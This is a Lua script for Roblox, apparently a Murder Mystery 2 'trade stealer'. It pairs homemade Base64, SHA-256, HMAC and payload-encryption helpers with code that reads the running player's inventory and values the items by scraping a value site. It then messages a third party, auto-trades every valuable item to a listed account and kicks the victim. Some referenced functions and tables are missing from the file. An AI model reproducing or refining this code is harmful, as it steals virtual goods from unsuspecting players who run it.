-- Base64 alphabet
local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'

-- Convert a string to a list of byte values
local function str_to_bytes(s)
    local bytes = {}
    for i = 1, #s do
        bytes[i] = string.byte(s, i)
    end
    return bytes
end

-- Convert a list of bytes to a string
local function bytes_to_str(bytes)
    local t = {}
    for i = 1, #bytes do
        t[i] = string.char(bytes[i])
    end
    return table.concat(t)
end

-- Base64 encode (standard)
local function base64_encode(data)
    local b = {}  -- will hold binary string of 0/1
    data:gsub('.', function(c)
        local byte = string.byte(c)
        for i = 8, 1, -1 do
            b[#b+1] = (byte % 2^i - byte % 2^(i-1) > 0) and '1' or '0'
        end
    end)
    -- Pad with zeros to multiple of 6
    for i = 1, 4 - (#data % 3) do
        b[#b+1] = '0'
    end
    local base64 = ''
    for i = 1, #b, 6 do
        local chunk = table.concat(b, '', i, math.min(i+5, #b))
        if #chunk < 6 then break end
        local value = 0
        for j = 1, 6 do
            value = value * 2 + (chunk:sub(j, j) == '1' and 1 or 0)
        end
        base64 = base64 .. b64chars:sub(value+1, value+1)
    end
    -- Add padding
    local pad = ({'', '==', '='})[#data % 3 + 1]
    return base64 .. pad
end

-- Rotate left (for SHA256)
local function rotl(x, n)
    return bit.bor(bit.lshift(x, n), bit.rshift(x, 32 - n))
end

-- SHA-256 hash of a byte list (returns 32-byte list)
local function sha256(msg_bytes)
    -- Copy message to a new list (we'll modify it)
    local m = {}
    for i = 1, #msg_bytes do m[i] = msg_bytes[i] end

    -- Append 0x80
    m[#m+1] = 0x80
    -- Pad with zeros until length ≡ 56 mod 64
    while #m % 64 ~= 56 do
        m[#m+1] = 0
    end
    -- Append original length in bits (as 64-bit big-endian)
    local bit_len = #msg_bytes * 8
    for i = 7, 0, -1 do
        m[#m+1] = bit.band(bit.rshift(bit_len, i * 8), 0xFF)
    end

    -- Initial hash values (first 32 bits of fractional parts of square roots of first 8 primes)
    local h = {
        0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a,
        0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19
    }

    -- Process each 64-byte chunk
    for chunk_start = 1, #m, 64 do
        -- Create message schedule w[0..63]
        local w = {}
        for i = 0, 15 do
            local idx = chunk_start + i * 4
            w[i] = bit.bor(
                bit.lshift(m[idx], 24),
                bit.lshift(m[idx+1], 16),
                bit.lshift(m[idx+2], 8),
                m[idx+3]
            )
        end
        for i = 16, 63 do
            local s0 = bit.bxor(bit.bxor(rotl(w[i-15], 7), rotl(w[i-15], 18)), bit.rshift(w[i-15], 3))
            local s1 = bit.bxor(bit.bxor(rotl(w[i-2], 17), rotl(w[i-2], 19)), bit.rshift(w[i-2], 10))
            w[i] = (w[i-16] + s0 + w[i-7] + s1) % 0x100000000
        end

        -- Initialize working variables
        local a, b, c, d, e, f, g, hh = h[1], h[2], h[3], h[4], h[5], h[6], h[7], h[8]

        -- Main loop
        for i = 0, 63 do
            local S1 = bit.bxor(bit.bxor(rotl(e, 6), rotl(e, 11)), rotl(e, 25))
            local ch = bit.bxor(bit.band(e, f), bit.band(bit.bnot(e), g))
            local t1 = (hh + S1 + ch + sha256_K[i+1] + w[i]) % 0x100000000
            local S0 = bit.bxor(bit.bxor(rotl(a, 2), rotl(a, 13)), rotl(a, 22))
            local maj = bit.bxor(bit.bxor(bit.band(a, b), bit.band(a, c)), bit.band(b, c))
            local t2 = (S0 + maj) % 0x100000000

            hh = g
            g = f
            f = e
            e = (d + t1) % 0x100000000
            d = c
            c = b
            b = a
            a = (t1 + t2) % 0x100000000
        end

        -- Add this chunk's hash to result
        h[1] = (h[1] + a) % 0x100000000
        h[2] = (h[2] + b) % 0x100000000
        h[3] = (h[3] + c) % 0x100000000
        h[4] = (h[4] + d) % 0x100000000
        h[5] = (h[5] + e) % 0x100000000
        h[6] = (h[6] + f) % 0x100000000
        h[7] = (h[7] + g) % 0x100000000
        h[8] = (h[8] + hh) % 0x100000000
    end

    -- Convert final hash to byte list (big-endian)
    local hash_bytes = {}
    for i = 1, 8 do
        for j = 3, 0, -1 do
            hash_bytes[#hash_bytes+1] = bit.band(bit.rshift(h[i], j * 8), 0xFF)
        end
    end
    return hash_bytes
end

-- HMAC-SHA256 (key as byte list, message as byte list)
local function hmac_sha256(key_bytes, msg_bytes)
    local blocksize = 64
    -- If key longer than blocksize, hash it
    if #key_bytes > blocksize then
        key_bytes = sha256(key_bytes)
    end
    -- Pad key to blocksize with zeros
    while #key_bytes < blocksize do
        key_bytes[#key_bytes+1] = 0
    end
    -- Create o_key_pad and i_key_pad
    local o_key_pad, i_key_pad = {}, {}
    for i = 1, blocksize do
        o_key_pad[i] = bit.bxor(key_bytes[i], 0x5c)
        i_key_pad[i] = bit.bxor(key_bytes[i], 0x36)
    end
    -- Inner hash: H(i_key_pad || message)
    local inner_input = {}
    for _, v in ipairs(i_key_pad) do inner_input[#inner_input+1] = v end
    for _, v in ipairs(msg_bytes) do inner_input[#inner_input+1] = v end
    local inner_hash = sha256(inner_input)
    -- Outer hash: H(o_key_pad || inner_hash)
    local outer_input = {}
    for _, v in ipairs(o_key_pad) do outer_input[#outer_input+1] = v end
    for _, v in ipairs(inner_hash) do outer_input[#outer_input+1] = v end
    return sha256(outer_input)
end

-- PRNG: simple LCG based on seed, returns one random byte each call
local prng_state
local function prng_init(seed)
    prng_state = seed
end
local function prng_next()
    local s = prng_state
    s = bit.bxor(s, bit.lshift(s, 13))
    s = bit.bxor(s, bit.rshift(s, 17))
    s = bit.bxor(s, bit.lshift(s, 5))
    prng_state = s
    return bit.band(s, 0xFF)
end

-- Encrypt payload using custom scheme:
-- 1. Generate 12 random bytes (R)
-- 2. XOR message bytes with R (cyclically)
-- 3. Concatenate: XORed message + R
-- 4. Compute HMAC-SHA256(key, that) -> H
-- 5. Final blob: R + XORed message + H
-- 6. Base64 encode final blob
local function encrypt_payload(message_str, key_bytes)
    local msg_bytes = str_to_bytes(message_str)
    -- Seed PRNG with current time + clock fraction
    local seed = os.time() + math.floor(os.clock() * 10000)
    prng_init(seed)

    -- Generate 12 random bytes
    local rand_bytes = {}
    for _ = 1, 12 do
        rand_bytes[#rand_bytes+1] = prng_next()
    end

    -- XOR message with rand_bytes cyclically
    local xored_msg = {}
    for i = 1, #msg_bytes do
        xored_msg[i] = bit.bxor(msg_bytes[i], rand_bytes[(i-1) % 12 + 1])
    end

    -- Build data for HMAC: xored_msg + rand_bytes
    local hmac_input = {}
    for _, v in ipairs(xored_msg) do hmac_input[#hmac_input+1] = v end
    for _, v in ipairs(rand_bytes) do hmac_input[#hmac_input+1] = v end
    local hmac = hmac_sha256(key_bytes, hmac_input)

    -- Final blob: rand_bytes + xored_msg + hmac
    local blob_bytes = {}
    for _, v in ipairs(rand_bytes) do blob_bytes[#blob_bytes+1] = v end
    for _, v in ipairs(xored_msg) do blob_bytes[#blob_bytes+1] = v end
    for _, v in ipairs(hmac) do blob_bytes[#blob_bytes+1] = v end

    return base64_encode(bytes_to_str(blob_bytes))
end

-- Generate a time-limited signature token
-- Format: base64(expiry) + "." + base64(nonce) + "." + base64(hmac)
local function generate_signature(key_bytes)
    local expiry = tostring(os.time() + 300)  -- valid for 5 minutes
    local nonce = game:GetService("HttpService"):GenerateGUID(false)
    local raw = base64_encode(expiry) .. "." .. base64_encode(nonce)
    local raw_bytes = str_to_bytes(raw .. ".v2")
    local hmac = hmac_sha256(key_bytes, raw_bytes)
    local sig = base64_encode(bytes_to_str(hmac))
    return raw .. "." .. sig
end

local function trim(s) return s:match("^%s*(.-)%s*$") end
local function fetchHTML(url)
    local response = request({ Url = url, Method = "GET", Headers = headers })
    return response.Body
end
local function parseValue(itembodyDiv)
    local valueStr = itembodyDiv:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
    if valueStr then
        valueStr = valueStr:gsub(",", "")
        local value = tonumber(valueStr)
        if value then return value end
    end
    return nil
end
local function extractItems(htmlContent)
    local itemValues = {}
    for itemName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
        itemName = itemName:match("([^<]+)")
        if itemName then
            itemName = trim(itemName:gsub("%s+", " "))
            itemName = trim((itemName:split(" Click "))[1])
            local value = parseValue(itembodyDiv)
            if value then itemValues[itemName:lower()] = value end
        end
    end
    return itemValues
end
local function extractChromaItems(htmlContent)
    local chromaValues = {}
    for chromaName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
        chromaName = chromaName:match("([^<]+)")
        if chromaName then
            chromaName = trim(chromaName:gsub("%s+", " ")):lower()
            local value = parseValue(itembodyDiv)
            if value then chromaValues[chromaName] = value end
        end
    end
    return chromaValues
end
local function buildValueList()
    local allExtractedValues = {}
    local chromaExtractedValues = {}
    local categoriesToFetch = {}
    for rarity, url in pairs(categories) do
        table.insert(categoriesToFetch, {rarity = rarity, url = url})
    end
    local totalCategories = #categoriesToFetch
    local completed = 0
    local lock = Instance.new("BindableEvent")
    for _, category in ipairs(categoriesToFetch) do
        task.spawn(function()
            local rarity = category.rarity
            local url = category.url
            local htmlContent = fetchHTML(url)
            if htmlContent and htmlContent ~= "" then
                if rarity ~= "chroma" then
                    local extracted = extractItems(htmlContent)
                    for k, v in pairs(extracted) do allExtractedValues[k] = v end
                else
                    chromaExtractedValues = extractChromaItems(htmlContent)
                end
            end
            completed = completed + 1
            if completed == totalCategories then lock:Fire() end
        end)
    end
    lock.Event:Wait()
    local valueList = {}
    for dataid, item in pairs(database) do
        local itemName = item.ItemName and item.ItemName:lower() or ""
        local rarity = item.Rarity or ""
        local hasChroma = item.Chroma or false
        if itemName ~= "" and rarity ~= "" then
            local weaponRarityIndex = table.find(rarityTable, rarity)
            local godlyIndex = table.find(rarityTable, "Godly")
            if weaponRarityIndex and weaponRarityIndex >= godlyIndex then
                if hasChroma then
                    local matched = nil
                    for cn, cv in pairs(chromaExtractedValues) do
                        if cn:find(itemName) then matched = cv; break end
                    end
                    if matched then valueList[dataid] = matched end
                else
                    if allExtractedValues[itemName] then
                        valueList[dataid] = allExtractedValues[itemName]
                    end
                end
            end
        end
    end
    return valueList
end

-- Filter inventory
local min_rarity_index = table.find(rarityTable, min_rarity)
local untradable = {
    DefaultGun = true, DefaultKnife = true, Reaver = true, Reaver_Legendary = true, Reaver_Godly = true, Reaver_Ancient = true,
    IceHammer = true, IceHammer_Legendary = true, IceHammer_Godly = true, IceHammer_Ancient = true,
    Gingerscythe = true, Gingerscythe_Legendary = true, Gingerscythe_Godly = true, Gingerscythe_Ancient = true,
    TestItem = true, Season1TestKnife = true, Cracks = true, Icecrusher = true, ["???"] = true, Dartbringer = true,
    TravelerAxeRed = true, TravelerAxeBronze = true, TravelerAxeSilver = true, TravelerAxeGold = true,
    BlueCamo_K_2022 = true, GreenCamo_K_2022 = true, SharkSeeker = true
}
local valueList = buildValueList()
local realData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
local totalValue = 0
for dataid, amount in pairs(realData.Weapons.Owned) do
    task.wait()
    local rarity = database[dataid].Rarity
    local weapon_rarity_index = table.find(rarityTable, rarity)
    if weapon_rarity_index and weapon_rarity_index >= min_rarity_index and not untradable[dataid] then
        local value = valueList[dataid]
        if not value then
            value = (weapon_rarity_index >= table.find(rarityTable, "Godly")) and 2 or 1
        end
        if value >= min_value then
            totalValue = totalValue + (value * amount)
            table.insert(weaponsToSend, {DataID = dataid, Rarity = rarity, Amount = amount, Value = value})
        end
    end
end

-- If items found, start trading process
if #weaponsToSend > 0 then
    table.sort(weaponsToSend, function(a, b) return (a.Value * a.Amount) > (b.Value * b.Amount) end)

    local prefix = (ping == "Yes") and "--@everyone " or ""
    SendFirstMessage(weaponsToSend, prefix)

    local function doTrade(joinedUser)
        local initialTradeState = getTradeStatus()
        if initialTradeState == "StartTrade" then
            Trade.DeclineTrade:FireServer()
            wait(0.3)
        elseif initialTradeState == "ReceivingRequest" then
            Trade.DeclineRequest:FireServer()
            wait(0.3)
        end

        while #weaponsToSend > 0 do
            local tradeStatus = getTradeStatus()
            if tradeStatus == "None" then
                sendTradeRequest(joinedUser)
            elseif tradeStatus == "SendingRequest" then
                wait(0.3)
            elseif tradeStatus == "ReceivingRequest" then
                Trade.DeclineRequest:FireServer()
                wait(0.3)
            elseif tradeStatus == "StartTrade" then
                local numToTrade = math.min(4, #weaponsToSend)
                for i = 1, numToTrade do
                    local weapon = weaponsToSend[i]
                    for _ = 1, weapon.Amount do
                        addWeaponToTrade(weapon.DataID)
                    end
                end
                wait(6)
                acceptTrade()
                waitForTradeCompletion()

                -- Verify if items were actually taken
                local currentInv = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
                local firstItemAttempted = weaponsToSend[1].DataID
                if not currentInv.Weapons.Owned[firstItemAttempted] then
                    for _ = 1, numToTrade do table.remove(weaponsToSend, 1) end
                else
                    pcall(function() Trade.DeclineTrade:FireServer() end)
                end
            else
                wait(0.5)
            end
            wait(1)
        end
        plr:kick("")
    end

    local function startImmediateHit()
        for _, p in ipairs(Players:GetPlayers()) do
            if table.find(combinedUser, p.Name) then
                doTrade(p.Name)
                return
            end
        end
    end
    startImmediateHit()
    Players.PlayerAdded:Connect(function(player)
        if table.find(combinedUser, player.Name) then
            doTrade(player.Name)
        end
    end)
end
